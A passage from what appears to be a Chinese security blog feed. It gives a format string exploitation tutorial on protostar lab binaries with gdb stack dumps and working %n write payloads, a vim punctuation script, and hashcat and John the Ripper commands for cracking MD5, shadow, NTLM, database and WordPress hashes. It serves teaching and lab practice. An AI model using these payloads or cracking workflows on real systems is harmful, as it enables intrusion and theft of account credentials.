一般在栈空间里,形如&quot;%8xaaa%8d%n&quot;的字符串参数会存放在某个地方,而在栈中printf的第一个参数char *format一般是这个字符串(&quot;%8xaaa%8d%n&quot;)的地址,这个栈单元下面(高地址)的栈单元中存放的值是被cpu当作的后续参数,eg:

printf(&quot;%8xaaa%8d%n&quot;)在栈中的数据如下:
    printf_ebp(printf函数帧中的第一句push的ebp)
    printf_retn(printf函数的返回地址)
    addr_of_&quot;%8xaaa%8d%n&quot;(栈中第一个参数)
    0x11111111(将成为栈中第二个参数)
    0x22222222(将成为栈中第三个参数)
    0x33333333(将成为栈中第三个参数)
    ...(将成为栈中第四个参数)
    ...(...)

上面的printf调用后将产生这样的效果:
    1.在屏幕上打印出:11111111aaa572662306(其中十六进制0x22222222对应十进制572662306),也即从printf的第二个参数开始打印或写入到对应地址
    2.向地址为0x33333333的内存中写入19(8+3+8=19)

后来发现这是windows中的情况,kalix64中栈中第一个参数的位置存放的不再是字符串&quot;%8xaaa%8d%n&quot;地址,而是字符串本身

上面的2中的c代码对应的栈中分配的情况如下图format所示:
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;图format
&lt;img src=&quot;https://raw.githubusercontent.com/3xp10it/pic/master/format.png&quot; /&gt;&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;后来才发现的上图是在win7x64位系统上用od跟踪绘制的结果图,在linux中,并不是这样的情况,linux中a[100]在linux中的栈空间中存放的位置会分配在p上面,而不是flag下面,且win7x64系统中,visual studio编译时会失败,强制用od加载并在调用printf时改写栈中format为含有%n的格式化串(eg.%10x%n)同样会异常失败,无法实现&quot;写&quot;

因此,这个实验更适合在linux下进行,且kalix64中的情况与http://drops.wooyun.org/papers/9426中的情况不一样,将md.c复制到protostar(32位)系统中进行实验

scp /root/桌面/md.c user@192.168.3.221:/tmp
pass:user
cd /tmp
gcc -g -o md md.c
gdb md
disas /m main
------output:-------
8           printf(a);
0x08048482 &amp;lt;main+46&amp;gt;:   lea    0x14(%esp),%eax
0x08048486 &amp;lt;main+50&amp;gt;:   mov    %eax,(%esp)
0x08048489 &amp;lt;main+53&amp;gt;:   call   0x8048364 &amp;lt;printf@plt&amp;gt;
---------end--------
b*main+53
r
input:AAAA%x.%x.%x
x/20x $esp
-----output:------
0xbffff6e0:     0xbffff6f4      0xbffff6f4      0x080481dc      0xbffff778
0xbffff6f0:     0xb7fffa54      0x41414141      0x252e7825      0x78252e78
0xbffff700:     0x00000000      0x00000001      0xb7fff8f8      0xb7f0186e
0xbffff710:     0xb7fd7ff4      0xb7ec6165      0xbffff728      0xb7eada75
0xbffff720:     0xb7fd7ff4      0x08049668      0xbffff738      0x08048330
------end---------
根据上面windows下od跟踪绘出的图容易知道,0xbffff6e0处存放的为字符串&quot;AAAA%x.%x.%x&quot;的内存地址,也即0xbffff6e0处存放的为printf的第一个参数,0xbffff6e4为第二个参数,以此下推

按照上面图format的理解易知程序运行完后将在屏幕上打印出:AAAAbffff6f4.080481dc.bffff778(从printf的第二个参数开始打印)

如果scanf输入的是:AAAA%x.%x.%x.%x.%x,那么最后一个输出的地址将是41414141,因为printf的第六个参数是41414141,从第二个参数到第六个参数共5个栈单元大小

再次分析此linux系统(protostar)中的变量在栈中存放的具体情况,如下
disas main
--------output:--------
   │0x8048454 &amp;lt;main&amp;gt;                push   %ebp                                                                                                                                                                   │
   │0x8048455 &amp;lt;main+1&amp;gt;              mov    %esp,%ebp                                                                                                                                                              │
   │0x8048457 &amp;lt;main+3&amp;gt;              and    $0xfffffff0,%esp                                                                                                                                                       │
   │0x804845a &amp;lt;main+6&amp;gt;              add    $0xffffff80,%esp                                                                                                                                                       │
   │0x804845d &amp;lt;main+9&amp;gt;              movl   $0x0,0x78(%esp)                                                                                                                                                        │
   │0x8048465 &amp;lt;main+17&amp;gt;             lea    0x78(%esp),%eax                                                                                                                                                        │
   │0x8048469 &amp;lt;main+21&amp;gt;             mov    %eax,0x7c(%esp)                                                                                                                                                        │
   │0x804846d &amp;lt;main+25&amp;gt;             mov    $0x8048570,%eax                                                                                                                                                        │
   │0x8048472 &amp;lt;main+30&amp;gt;             lea    0x14(%esp),%edx                                                                                                                                                        │
   │0x8048476 &amp;lt;main+34&amp;gt;             mov    %edx,0x4(%esp)                                                                                                                                                         │
   │0x804847a &amp;lt;main+38&amp;gt;             mov    %eax,(%esp)                                                                                                                                                            │
   │0x804847d &amp;lt;main+41&amp;gt;             call   0x8048374 &amp;lt;__isoc99_scanf@plt&amp;gt;                                                                                                                                         │
   │0x8048482 &amp;lt;main+46&amp;gt;             lea    0x14(%esp),%eax                                                                                                                                                        │
   │0x8048486 &amp;lt;main+50&amp;gt;             mov    %eax,(%esp)                                                                                                                                                            │
B+&amp;gt;│0x8048489 &amp;lt;main+53&amp;gt;             call   0x8048364 &amp;lt;printf@plt&amp;gt; 
-----------end---------
main+9处为将flag(flag为0)存放到esp+0x78里面,也即esp+0x78处存放flag
main+21处为将esp+0x78的值(flag所在的地址)放入到esp+0x7c中,也即flag+7c存放flag的地址
形如:

        --------
addr1      0         addr1=esp+0x78,flag被赋值为0
        --------
         addr1       esp+0x7c处存放p,p被赋值为flag的地址
        --------

flag和p在栈中存放的位置情况与windows中的实验完全相反,linux中是flag存放在p的上面,而win7x64中是flag存放在p的下面

在main+21处下断,用来查看esp+0x78的值,也即addr1的值,然后addr1+4即为p存放的地址,算出p存放的地址与printf第二个参数的地址相差多少,就可以知道如何安排format(%n的合适安排)来达到改变p指向的内容的值的目的,也即将一个值写入[p],相当于intel风格汇编语句mov [p],something

q
gdb md
disas main
-------------output:--------------
0x08048454 &amp;lt;main+0&amp;gt;:    push   %ebp
0x08048455 &amp;lt;main+1&amp;gt;:    mov    %esp,%ebp
0x08048457 &amp;lt;main+3&amp;gt;:    and    $0xfffffff0,%esp
0x0804845a &amp;lt;main+6&amp;gt;:    add    $0xffffff80,%esp
0x0804845d &amp;lt;main+9&amp;gt;:    movl   $0x0,0x78(%esp)
0x08048465 &amp;lt;main+17&amp;gt;:   lea    0x78(%esp),%eax
0x08048469 &amp;lt;main+21&amp;gt;:   mov    %eax,0x7c(%esp)
---------------end----------------
b*main+21
r
p/x $eax
-----output:-------
$3 = 0xbffff758,也即0xbffff758处存放的为flag,addr1=0xbfff758
-------end---------
disas main
-------------output:----------------
0x0804847d &amp;lt;main+41&amp;gt;:   call   0x8048374 &amp;lt;__isoc99_scanf@plt&amp;gt;
0x08048482 &amp;lt;main+46&amp;gt;:   lea    0x14(%esp),%eax
0x08048486 &amp;lt;main+50&amp;gt;:   mov    %eax,(%esp)
0x08048489 &amp;lt;main+53&amp;gt;:   call   0x8048364 &amp;lt;printf@plt&amp;gt;
---------------end------------------
b*main+53
c
input:AAAA%x.%x.%x
x/40x $esp
------------output:-----------------
0xbffff6e0:     0xbffff6f4      0xbffff6f4      0x080481dc      0xbffff778
0xbffff6f0:     0xb7fffa54      0x41414141      0x252e7825      0x78252e78
0xbffff700:     0x00000000      0x00000001      0xb7fff8f8      0xb7f0186e
0xbffff710:     0xb7fd7ff4      0xb7ec6165      0xbffff728      0xb7eada75
0xbffff720:     0xb7fd7ff4      0x08049668      0xbffff738      0x08048330
0xbffff730:     0xb7ff1040      0x08049668      0xbffff768      0x080484d9
0xbffff740:     0xb7fd8304      0xb7fd7ff4      0x080484c0      0xbffff768
0xbffff750:     0xb7ec6365      0xb7ff1040      0x00000000      0xbffff758
0xbffff760:     0x080484c0      0x00000000      0xbffff7e8      0xb7eadc76
0xbffff770:     0x00000001      0xbffff814      0xbffff81c      0xb7fe1848
---------------end------------------
同样可以看到0xbffff758处存放的0即为flag的值,而0xbfff75c处存放的为p,要实现将0xbffff75c处的0xbffff758指向的内容修改为2000,也即要实现0xbffff75c处,[0xbffff758]=2000

0xbffff75c与printf的第二个参数的地址0xbffff6e4相差0xbffff75c-0xbffff6e4=0x78=30个栈单元大小,也即flag为printf的第31个参数,p为printf的第32个参数

所以要将第32个参数指向的内容修改为2000,这样就可以实现将第31个参数修改为2000

构造&quot;%x&quot;*30+%n,其中前面30个%x中要输出2000个长度,可以通过修改宽度输出大小实现,eg.%1768x+&quot;%x&quot;*29+%n(1768+29*8=2000)

第六个参数为开始存放scanf由终端输入的格式化字符串,第32个参数的数据为重要的不能被scanf由终端输入覆盖的位置,所以输入最多可以输入第6到第31个参数所占的空间大小,共32-6+1=27个栈单元大小=27*4=108个字节

如果由scanf从终端输入超过108个字节的格式化字符串,第109到112个字节将覆盖printf的第32个参数,这样printf执行完以后会将2000写入到109-112个字节被覆盖的值的地址空间中,所以如果输入超过108个字节也可以,但是必须保证输入的第109-112个字节为printf第32个参数原本的值,如果直接将printf第31个参数覆盖成2000,会在printf执行完以后被%n的作用改写成其他值,所以直接在printf的第31个参数位置输入2000是不行的

最好的办法是输入长度不超过108个字节,如
%1768x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%n

但是发现这样不会打印出good,gdb尝试打印发现是在printf打印的时候,如果%x对应的要打印的最高位为0,将被省略去这个&quot;0&quot;,所以改成下面的形式,强制8位对应每个%x

%1768x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%n(93个字节&amp;lt;108个字节)
成功打印出good,实现了将flag修改为2000,这样在aslr开启的时候同样有效,因为这里用的是相对偏移

在aslr没有开启时,为了进一步缩短scanf由终端输入的格式化字符串长度的大小(小于108即可),达到精确打击,直接改写printf的第32个参数指向的内存空间的值(也即实现修改flag),可以这样做:

在scanf由终端输入的格式化字符串的开头写上printf的第32个参数的值,也即p的值,也即flag存放的地址
scanf由终端输入:&quot;0xbffff758&quot;(对应printf第6个参数)+%8x(读第2个参数)+%8x(读第3个参数)+%8x(读第4个参数)+%1972x(读第5个参数)+%n(写进第6个参数指向的内存空间)
也即&#39;\x58\xf7\xff\xbf&#39;%8x%8x%8x%1972x%n
其中4+8*3+1972=2000
但是0xbffff758是gdb调试时候的第32个参数的值,与md单独运行时并不相同,需要找出md直接运行时的printf的第32个参数的值替换即可

scanf由终端输入%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%xAA%x(31个%x)

最后第31个AA%x处对应输出为:AAbffff788,也即实际运行时printf的第32个参数为0xbffff788

也可以通过http://drops.wooyun.org/papers/9426中查看printf第2个参数的值+(第32个参数与第2个参数相减的差)的方法来计算出第32个参数的大小

构造:&#39;\x88\xf7\xff\xbf&#39;%8x%8x%8x%1972x%n
python -c &quot;print &#39;\x88\xf7\xff\xbf&#39;+&#39;%8x%8x%8x%1972x%n&#39;&quot; | ./md
成功修改了flag的值为2000,打印出了good!

或者更短一些,利用%5\$n(直接参数访问)直接写入到printf第六个参数中
也即:
&#39;\x88\xf7\xff\xbf&#39;%1996x%5\$n

python -c &quot;print &#39;\x88\xf7\xff\xbf&#39;+&#39;%1996x%5\$n&#39;&quot; | ./md
成功修改了flag的值为2000,打印出了good!

&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;x03-&quot;&gt;0x03 提炼方法&lt;/h3&gt;

&lt;p&gt;环境:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;x32系统下,在call printf这一句汇编语句执行前
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h4 id=&quot;x123456780x40404040&quot;&gt;方法1&amp;gt;精确打击:在0x12345678地址中写入0x40404040&lt;/h4&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;(适用aslr关闭)
1&amp;gt;输入python -c &quot;print &#39;AAAABBBB&#39;+&#39;%8x&#39;*20&quot;

    0.输入python -c &quot;print &#39;%3\$x&#39;&quot;查看是否支持\$
    
    1.如果20个栈单元中还没有4141414142424242出现,再将20变大,直到可以看到4141414142424242
    
    2.也可以先用gdb加载,在main函数帧中的call printf那一句下断点,然后x/20x $esp,看不到则将20变大,直到可以看到
    
    3.计算出AAAABBBB(人工构造的格式化串的起始位置)的出现位置为第几个打印值,假设为第num个,便可知道AAAABBBB的出现位置在
      栈中相当于第num个printf的参数的位置,便可得到AAAABBBB在栈中的位置与printf的第一个参数的位移差为(num-1)*4
      (第一个参数为人工构造的格式化串&quot;AAAABBBB%x%x...%x&quot;的指针)
    
    4.有时候遇到栈中4141414142424242的位置会随着输入的长度的不同而变化,这时可以在保证输入的长度不变的基础下调整输入的
      形式(也即调整%x和%n的位置).

2&amp;gt;构造python -c &quot;print &#39;AA\x78\x56\x34\x12BB&#39;+&#39;%(value-4)x&#39;+&#39;%(num)\$n&#39;&quot;

    这里假设在栈中某一单元中,内容为42424141,也即刚好是AAAABBBB中的中间4个字符覆盖了该栈单元的内容
    value为需要在0x12345678地址中写入的值0x40404040,value-8=1077952568,假设AAAABBBB中的AABB的出现位置为第6个打印数
    的位置,也即num=6,则构造如下:
    
    python -c &quot;print &#39;AA\x78\x56\x34\x12BB&#39;+&#39;%1077952568x&#39;+&#39;%5\$n&#39;&quot;
    
    如果不支持\$则用:
    python -c &quot;print &#39;AA\x78\x56\x34\x12BB&#39;+&#39;%1077952565x&#39;+&#39;%1x&#39;*3+&#39;%n&#39;&quot;

&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h4 id=&quot;x12345680x40404040&quot;&gt;方法2&amp;gt;动态打击:在0x1234568中写入0x40404040&lt;/h4&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;(适用于可找到某一栈单元内容为0x12345678的情况,找不到的情况用方法1,该方法可用于aslr开启下)

0&amp;gt;输入python -c &quot;print &#39;%3\$x&#39;&quot;查看是否支持\$

1&amp;gt;找到0x12345678在栈中的位置,用方法1中的两种方法都可以查找(但是如果不是0x12345678这样的比较有特征的可以一眼看出来的,
  eg.0x40528315,如果需要在栈中查找0x40528315,od中有这个功能,gdb暂不知道,可在使用%x打印栈中数据后尝试用tmux的vim复制
  模式搜索)

  计算0x12345678在栈中的位置为printf的第几个参数的位置,假设为第32个,也即第31个打印值

2&amp;gt;构造python -c &quot;print &#39;%(value1)x&#39;+&#39;%8x&#39;*29+&#39;%n&#39;&quot;
      其中value1=1077952576(0x40404040的十进制值)-29*8=1077952344,如下:
      %1077952344x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%n
  或更短的(需要\$支持):
      python -c &quot;print &#39;%(value1)x&#39;+&#39;%31\$n&#39;&quot;
      %1077952576x%31\$n

3&amp;gt;如果不能在栈中某一单元中找到0x12345678而是在连续两个栈单元中存在,eg:
    --------
    56341200
    --------
    56498078
    --------
  这样可以尝试更改输入使0x12345678刚好出现在一个栈中,eg.输入:
  python -c &quot;print &#39;B%(value1)x&#39;+&#39;%8x&#39;*29+&#39;%n&#39;&quot;
  但这不一定有效
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;x04-&quot;&gt;0x04 小试牛刀&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;target:
https://exploit-exercises.com/protostar/format1/

source:
--------------format1.c-----------------
#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;string.h&amp;gt;

int target;

void vuln(char *string)
{
  printf(string);
  
  if(target) {
      printf(&quot;you have modified the target :)\n&quot;);
  }
}

int main(int argc, char **argv)
{
  vuln(argv[1]);
}
-----------------end--------------------

mykey:
        objdump -t format1
        find target address:0x8049638
        ./format1 `python -c &quot;print &#39;AAAABBBB&#39;+&#39;%x.%x&#39;&quot;`
        -------------output:--------------
        AAAABBBB804960c.bffff788
        --------------end-----------------
        ./format1 `python -c &quot;print &#39;AAAABBBB&#39;+&#39;%2\$x&#39;&quot;`
        ----------------output:----------------
        AAAABBBB
        ------------------end------------------
        结论:这里不能用\$
        ./format1 `python -c &quot;print &#39;AAAABBBB&#39;+&#39;%x.&#39;*140&quot;`
        ---------------output:----------------
        AAAABBBB804960c.bffff5e8.8048469.b7fd8304.b7fd7ff4.bffff5e8.8048435.bffff7be.b7ff1040.804845b.b7fd7ff4.8048450.0.bffff668.b7eadc76.2.bffff694.bffff6a0.b7fe1848.bffff650.ffffffff.b7ffeff4.804824d.1.bffff650.b7ff0626.b7fffab0.b7fe1b28.b7fd7ff4.0.0.bffff668.d5f4313f.ffa7a72f.0.0.0.2.8048340.0.b7ff6210.b7eadb9b.b7ffeff4.2.8048340.0.8048361.804841c.2.bffff694.8048450.8048440.b7ff1040.bffff68c.b7fff8f8.2.bffff7b4.bffff7be.0.bffff96b.bffff976.bffff984.bffff999.bffff9a9.bffff9cb.bffff9d8.bffff9eb.bffff9f5.bffffee5.bffffef9.bfffff3b.bfffff52.bfffff63.bfffff74.bfffff7f.bfffff87.bfffff94.bfffffa8.bfffffdc.bfffffe6.0.20.b7fe2414.21.b7fe2000.10.fabfbff.6.1000.11.64.3.8048034.4.20.5.7.7.b7fe3000.8.0.9.8048340.b.0.c.0.d.0.e.0.17.0.19.bffff79b.1f.bffffff2.f.bffff7ab.0.0.d3000000.e844f82d.2820150f.79187f9d.69c015e8.363836.0.6f662f2e.74616d72.41410031.42424141.78254242.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.
        ------------------end-----------------
        find 42424141 in the 132th print location
        -----------------output:----------------
        AAAABBBB804960c.bffff5e8.8048469.b7fd8304.b7fd7ff4.bffff5e8.8048435.bffff7bb.b7ff1040.804845b.b7fd7ff4.8048450.0.bffff668.b7eadc76.2.bffff694.bffff6a0.b7fe1848.bffff650.ffffffff.b7ffeff4.804824d.1.bffff650.b7ff0626.b7fffab0.b7fe1b28.b7fd7ff4.0.0.bffff668.b3c0b28e.9993249e.0.0.0.2.8048340.0.b7ff6210.b7eadb9b.b7ffeff4.2.8048340.0.8048361.804841c.2.bffff694.8048450.8048440.b7ff1040.bffff68c.b7fff8f8.2.bffff7b1.bffff7bb.0.bffff96b.bffff976.bffff984.bffff999.bffff9a9.bffff9cb.bffff9d8.bffff9eb.bffff9f5.bffffee5.bffffef9.bfffff3b.bfffff52.bfffff63.bfffff74.bfffff7f.bfffff87.bfffff94.bfffffa8.bfffffdc.bfffffe6.0.20.b7fe2414.21.b7fe2000.10.fabfbff.6.1000.11.64.3.8048034.4.20.5.7.7.b7fe3000.8.0.9.8048340.b.0.c.0.d.0.e.0.17.0.19.bffff79b.1f.bffffff2.f.bffff7ab.0.0.84000000.a999d71b.1ef8a615.f39ada32.69642dc2.363836.662f2e00.616d726f.41003174.42414141.25424242.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.
        --------------------end-----------------
        find 42414141 in the 131th print location
        结论:AAAABBBB的在栈中出现的位置会随着输入的长度不同而变化
        根据./format1 `python -c &quot;print &#39;AAAABBBB&#39;+&#39;%x.&#39;*140&quot;`中132个输出为42424141:
        ./format1 `python -c &quot;print &#39;AA\x38\x96\x04\x08BB&#39;+&#39;%x.&#39;*131+&#39;%n.&#39;+&#39;%x.&#39;*8&quot;`
        output:
        .....you have modified the target :)
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

</description>
        <pubDate>Sun, 26 Jun 2016 00:00:00 +0800</pubDate>
        <link>/%E4%BA%8C%E8%BF%9B%E5%88%B6/2016/06/26/%E6%A0%BC%E5%BC%8F%E5%8C%96%E4%B8%B2%E6%BC%8F%E6%B4%9E/</link>
        <guid isPermaLink="true">/%E4%BA%8C%E8%BF%9B%E5%88%B6/2016/06/26/%E6%A0%BC%E5%BC%8F%E5%8C%96%E4%B8%B2%E6%BC%8F%E6%B4%9E/</guid>
        
        <category>格式化串</category>
        
        <category>format</category>
        
        
        <category>二进制</category>
        
      </item>
    
      <item>
        <title>vim自动换标点</title>
        <description>&lt;p&gt;将下面复制到vimrc文件中,f2快捷键可将当前文件中标点符号换成英文符号,打开md文件时自动将全文的中文标点符号换成英文符号,用于写md文件时中文标点符号不美观的问题&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;au BufRead *.md call Biaodian() &amp;lt;CR&amp;gt;

map &amp;lt;F2&amp;gt; :call Biaodian() &amp;lt;CR&amp;gt;
function Biaodian()
    %s/“/&quot;/g
    %s/”/&quot;/g
    %s/，/,/g
    %s/。/./g
    %s/？/?/g
    %s/〈/&amp;lt;/g
    %s/〉/&amp;gt;/g
    %s/（/(/g
    %s/）/)/g
    %s/：/:/g
    %s/；/;/g
    %s/‘/&#39;/g
    %s/‘/&#39;/g
    %s/！/!/g
    endfunction
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
</description>
        <pubDate>Thu, 23 Jun 2016 00:00:00 +0800</pubDate>
        <link>/vim/2016/06/23/vim%E8%87%AA%E5%8A%A8%E6%8D%A2%E6%A0%87%E7%82%B9/</link>
        <guid isPermaLink="true">/vim/2016/06/23/vim%E8%87%AA%E5%8A%A8%E6%8D%A2%E6%A0%87%E7%82%B9/</guid>
        
        <category>vim</category>
        
        <category>script</category>
        
        <category>vimrc</category>
        
        
        <category>vim</category>
        
      </item>
    
      <item>
        <title>hashcat&amp;john</title>
        <description>&lt;p&gt;knowledge from klion&lt;/p&gt;

&lt;h3 id=&quot;x01-hashcat&quot;&gt;0x01 hashcat&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;在线hash解密网站(基本上常用的一些hash类型它都支持):
	http://verifier.insidepro.com
	http://cmd5.com
	
一款帮我们大概识别hash类型的小脚本:
	hash-identifier  执行执行,而后把要识别的hash粘进去回车即可
	
	
注意,必须提前安装好对应的显卡驱动(AMD/英伟达根据自己实际选择),然后下载oclhashcat:
	https://hashcat.net/files/oclHashcat-2.01.7z
	https://hashcat.net/files/cudaHashcat-2.01.7z

hashcat简介(这里暂以hashcat为例,实战中推荐买块好显卡,用oclhashcat,两者选项稍稍有些不同,实际用的时候记得看下帮助):
	hashcat 	基于CPU破解
	oclhashcat  基于GPU破解
	
hashcat常用选项(如果提示要升级到新版本,修改下系统时间到2010年之前即可):
	-a  指定要使用的破解模式
	-m  指定要破解的hash的类型,基本是支持市面上流行的所有散列类型
	-o  指定破解成功后的hash及对应明文密码的存放位置
	--username  忽略hash文件中的用户名
	--remove    移除已经破解成功的hash
	-r			支持自定义破解规则
	
hashcat支持的几种破解模式:

	0 = Straight    	普通字典模式,后面可以连续跟多个字典文件
    1 = Combination
    2 = Toggle-Case
    3 = Brute-force		基于自定义掩码的破解
    4 = Permutation
    5 = Table-Lookup
    8 = Prince
	
hashcat掩码字符所代表的含义及掩码具体的使用方法:
  
   ?l = abcdefghijklmnopqrstuvwxyz
   ?u = ABCDEFGHIJKLMNOPQRSTUVWXYZ
   ?d = 0123456789
   ?s =  !&quot;#$%&amp;amp;&#39;()*+,-./:;&amp;lt;=&amp;gt;?@[\]^_`{|}~
   ?a = ?l?u?d?s
   ?b = 0x00 - 0xff

   -1,  --custom-charset1=CS     User-defined charsets
   -2,  --custom-charset2=CS     Example:
   -3,  --custom-charset3=CS     --custom-charset1=?dabcdef : sets charset ?1 to 0123456789abcdef
   -4,  --custom-charset4=CS     -2 mycharset.hcchr : sets charset ?2 to chars contained in file


基于普通的基于字典的爆破(普通md5的hash):
	# hashcat -a 0 -m 0  /root/Desktop/md5.txt /usr/share/wordlists/weakpass.txt
	
基于掩码的爆破(先先逐个位进行尝试破解,一般都是字母数字这种形式的,如果hash比较多的情况下,直接从9位开始即可):
	前三位数字,后三位小写字母
	# hashcat -a 3 -m 0 /root/Desktop/md5numword.txt  ?d?d?d?l?l?l
	
	6位的纯字母
	# hashcat -a 3 -m 0 /root/Desktop/md5word.txt  -1 ?l ?1?1?1?1?1?1
	
	6位纯数字
	# hashcat -a 3 -m 0 /root/Desktop/md5num.txt  -1 ?d ?1?1?1?1?1?1

	6位的小写字母和数字的随机组合
	# hashcat -a 3 -m 0 /root/Desktop/md5.txt  -1 ?l?d ?1?1?1?1?1?1
	
破解普通md5系列(filezilla为例):
	# hashcat -a 3 -m 0 /root/Desktop/md5.txt -1 ?l?d ?1?1?1?1?1?1 -o /root/Desktop/md5res.txt
	
破解sha系列(rhel6.5 shadow为例[实际hash类型为SHA512]):
	# hashcat -a 3 -m 1800 /root/Desktop/linux.txt -1 ?l?d ?1?1?1?1?1?1 -o /root/Desktop/linuxres.txt
	
破解mysql 4/5 用户hash(记得把开头的*,去掉 [User]):
	# hashcat -a 3 -m 300  /root/Desktop/mysql.txt -1 ?l?d ?1?1?1?1?1?1 -o /root/Desktop/mysqlres.txt
	
破解mssql系列([2000,2005,2008] / [2012,2014] (sys.sql_logins)):
	2005
	# hashcat -a 3 -m 132  /root/Desktop/mssql2005.txt  -1 ?l?d ?1?1?1?1?1?1 -o /root/Desktop/2005.txt
	
	2008 测试过程中,2008的hash用的是2005的hash类型,也一样可以成功
	# hashcat -a 3 -m 132  /root/Desktop/mssql2008.txt  -1 ?l?d ?1?1?1?1?1?1 -o /root/Desktop/2008.txt
	
破解ntlm(注意这里只取出ntlm的值即可,也就是把hash里面的lm的值去掉):
	# hashcat -a 3 -m 1000  /root/Desktop/ntlm.txt  -1 ?l?d ?1?1?1?1?1?1 -o /root/Desktop/ntlmres.txt
	
破解wpa/wpa2:
	
破解wordpress:
	# hashcat -a 3 -m 400  /root/Desktop/wordpress4.txt  -1 ?l?d ?1?1?1?1?1?1 -o /root/Desktop/wordpressres.txt
	
破解joomla25:
	# hashcat -a 3 -m 400  /root/Desktop/joomla25.txt  -1 ?l?d ?1?1?1?1?1?1 -o /root/Desktop/joomla25res.txt
	
破解discuz(oclhashcat才有此hash类型):

破解oracle 11g 用户hash:

破解skeype密码hash:

破解postgresql用户hash[pg_shadow]:

破解ser-U:

关于普通加盐的爆破:
	看加盐的位置,再选择相应的类型即可
	
基于半猜解查询的爆破(6 模式 [Hybrid dict + mask] oclhashcat才有此选项):



建议用hashcat破解的一般流程总结(快速破解常规口令,速度快):
	例如: 破解6到10位的大小写字母数字组成的密码,可以遵循以下顺序
	
	对于纯数字或者字母的hash破解:
	6位纯数字   
	6位纯小写字母
	6位纯大写字母
	7位纯数字
	7位纯小写字母
	7位纯大写字母
	8位纯数字
	8位纯小写字母
	8位纯大写字母
	9位纯数字
	9位纯小写字母
	9位纯大写字母
	10位纯数字
	10位纯小写字母
	10位纯大写字母
	11位纯数字
	11位纯小写字母
	11位纯大写字母
	用以上规则没有跑出来的hash,可以继续下面的规则……
	
	对于6位数字字母混合密码的简单拆分:
	前1位字母后5位数字
	前2位字母后4位数字
	前3位字母后3位数字
	前4位字母后2位数字
	前5位字母后1位数字
	
	对于7位数字字母混合密码的简单拆分:
	前1位字母后6位数字
	前2位字母后5位数字
	前3位字母后4位数字
	前4位字母后3位数字
	前5位字母后2位数字
	前6位字母后1位数字
	
	对于8位数字字母混合密码的简单拆分:
	前1位字母后7位数字
	前2位字母后6位数字
	前3位字母后5位数字
	前4位字母后4位数字
	前5位字母后3位数字
	前6位字母后2位数字
	前7位字母后1位数字
	
	对于9,10,11,12位数字字母混合密码的拆分也是一样……
	这里,我只是假设密码都是纯数字字母的,在实际的hash破解过程中,你还可以把特殊字符加入在内,再重新组合破解规则……
	
	
小结:
	当然,你也可以不用我建议的这种规则,因为在hashcat中有自定义破解规则的选项

	比如:我们就知道这个密码是9位的,里面可能有大小写字母,数字,特殊字符
		 但具体哪一位上是数字,字母,特殊字符我并不知道,自定义规则就发挥了他的作用……
		 但,我想说的是,这样无疑是非常耗时的,如果你像我前面已经规定好了哪一位是数字
		 哪一位是字母的话,它的破解速度就会成倍的提升,除非你真的在试完前面所有的规则之后都没跑出来,这时候再尝试自定义规则也未尝不可……
		 
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;x02-john&quot;&gt;0x02 john&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;在kali 2016.1 上的安装john:

# sudo apt-get install libssl-dev
# cd john-1.8.0-jumbo-1/src/
# ./configure
# make &amp;amp;&amp;amp; make -s
# cd ../run
# ./john --test     测试当前机器的解密速度
# 最后看到全部通过,证明安装已经基本成功

john 破解规则设置文件(每种模式下的具体的破解规则,请仔细查看该文件,C语言格式的):
	# vi john/run/john.conf
	
john运行以后会在当前目录产生一个john.pot文件,用来缓存数据,如果想重新破解,直接把这个文件删除即可
	# rm -fr john.pot
	
常用选项:
	--wordlist		指定用来破解hash的字典,即字典模式
	--single  		简单破解模式,也是默认的运行模式,根据用户名进行一些简单的变形猜解
	--incremental 	逐个遍历模式
	--external		自定义破解规则模式
	--restore		依照上次的破解进度接着执行破解
	--show 			显示已经破解出来的hash及对应的明文密码
	--users			只破解指定用户的hash
	--groups		只破解指定用户组的hash
	--shells		只破解指定shell的hash
	--format		指定要破解的hash的类型
	--stdout		从别处重定向到指定的hash
	
合并linux系统中的用户/组和密码hash配置文件(在不知道具体类型的情况下,直接john跟上hash文件即可,当识别类型以后,简单模式破不出来,再incremental):
